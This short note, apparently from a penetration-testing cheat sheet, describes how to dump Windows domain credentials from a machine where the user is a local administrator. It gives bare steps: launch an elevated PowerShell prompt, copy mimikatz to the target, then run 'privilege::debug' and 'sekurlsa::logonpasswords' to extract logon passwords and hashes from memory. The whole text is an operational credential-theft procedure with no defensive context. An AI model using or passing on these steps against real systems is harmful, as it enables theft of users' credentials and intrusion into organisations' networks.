Domain Hashes can be extracted from machines where the user is a local administrator.
# Step 1:
Launch powershell prompt with elevated privileges.
# Step 2:
Transfer mimikatz to target.
# Step 3:
Dump credentials.
```
privilege::debug
```
```
sekurlsa::logonpasswords
```
